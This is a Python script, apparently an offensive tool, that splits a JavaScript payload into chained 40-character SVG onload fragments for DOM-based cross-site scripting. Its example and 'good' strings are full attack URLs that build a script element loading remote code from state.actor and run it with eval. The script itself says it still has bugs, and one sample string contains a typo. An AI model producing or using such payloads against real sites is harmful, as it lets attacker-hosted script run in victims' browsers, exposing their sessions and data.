#!/usr/bin/env python3

# Script to compress any payload into a series of 40 character dom-based XXS payloads
# Still has some bugs

### Example payload to load and execute a remote javascript file from state.actor/aler.js
"""
http://www.example.com/ooops/d35fs23hu73
ds/blocked.html?abcdeaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s='a=document.createElement'">
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='(\'script\'); a.src=\'';">
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='//state.actor/aler.js\''">
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='; document.body'">bbbbbbbb
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="s+='.appendChild(a);'">bbbbbbb
</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
" onload="eval(s)" ></svg>
"""

# Config
# Warning: don't use variable s in your payload
PAYLOAD = "a=document.createElement(\'script\'); a.src=\'{}\'; document.body.appendChild(a)".format("//state.actor/alert.js;")
CHUNK_LEN=40
DOMAIN = "http://www.example.com/"
# End config

# Build a url that's exactly 40 chars so the last split is right after it
output_base = DOMAIN+"ooops/d35fs23hu73ds/blocked.html?"
print("Prefix is length {}... ".format(len(output_base)), end=" ")
pad_len = 40 - (len(output_base) % 40) if (len(output_base) % CHUNK_LEN) != 0 else 0
print("Adding {} to make it round, plus 1".format(pad_len))
output_base += "_"*(pad_len+2)

# XSS will be in chunks of 
# <svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa" onload="s='a=document.createElement'">
# such that the <BR> goes in the a's maximizing our payload size
# <svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa<BR>" onload="s='a=document.createElement'">
PREFIX = '<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa" onload="'
SUFFIX = '">'

# Now URL is aligned such that BR goes after it and payload can begin
start = True
idx = 0

# Now we're going to build a string into the variable s
# and then eval it
PAYLOAD = PAYLOAD.replace("\'","\\\'") # escape single quotes

output = ""
while idx < len(PAYLOAD):
    assert((len(output) % CHUNK_LEN) == 0), "Error, chunk length is {}: {}".format(len(output), output)
    old_len = len(output)
    output += PREFIX
    if start:
        output+= "s='"
        start = False
    else:
        output+= "s+='"
    len_so_far = len(output)-old_len-CHUNK_LEN # We're in the second chunk now
    suffix_len = len(SUFFIX) + 1 # For trailing '

    print("LSF: " , len_so_far)

    payload_out_len = min(len(PAYLOAD)-idx, CHUNK_LEN - len_so_far - suffix_len) # Either rest of payload or enough to max out at 40 with prefix+suffix
    is_last = (CHUNK_LEN - len_so_far - suffix_len) != payload_out_len

    this_suffix = SUFFIX

    if is_last: # Prepend suffix with whitespace
        print("ISLAST")
        this_suffix = " "*(CHUNK_LEN*2-len(PAYLOAD)-idx) + SUFFIX


    if PAYLOAD[idx+payload_out_len-1] == '\\': # Can't split backslash between two blocks
        output += PAYLOAD[idx:idx+payload_out_len-1]
        this_suffix = "' " + SUFFIX
        idx += payload_out_len-1
    else:
        output += PAYLOAD[idx:idx+payload_out_len]
        idx += payload_out_len

    output += this_suffix

    assert(len(output) <= old_len+2*40), "Have {} which is > {}".format(len(output), old_len+2*40) # Must fit in two chunks. One for svg junk, one for payload

    pad_len = 40 - (len(output) % 40) if (len(output) % CHUNK_LEN) != 0 else 0
    assert(not (not is_last and pad_len > 0)), "Why are we padding an intermediate chunk? len={}, pad={}".format(len(output), pad_len)

    output += "_"*pad_len

output+=PREFIX+";eval(s)"+SUFFIX

print(output_base)
for idx,c in enumerate(output):
    if ((idx%40) == 0): print()
    print(c, end="")

print()
output = output_base + output
print(output)

def split_url(u):
    b = u[0]
    for i in range(1, len(u)):
        b += u[i]
        if (i%40==0): b+= "<br/>";
    return b

print("\n\nSPLITS TO")
print(split_url(output))

good="""http://www.asdfcom.com/ooops/d35fs23hu73ds/blocked.html?abcdeaaaaaaaaaaaaaaaaaaaa=<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa" onload="s='a=document.createElement'"></svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa" onload="s+='(\'script\'); a.src-\'';"></svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa" onload="s+='//state.actor\'        '"></svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa" onload="s+='; document.body'">bbbbbbbb</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa" onload="s+='.appendChild(a);'">bbbbbbb</svg>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=<svg junk="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa" onload="eval(s)" ></svg>"""

print("\n\nGOT SPLITS TO")
print(split_url(good))
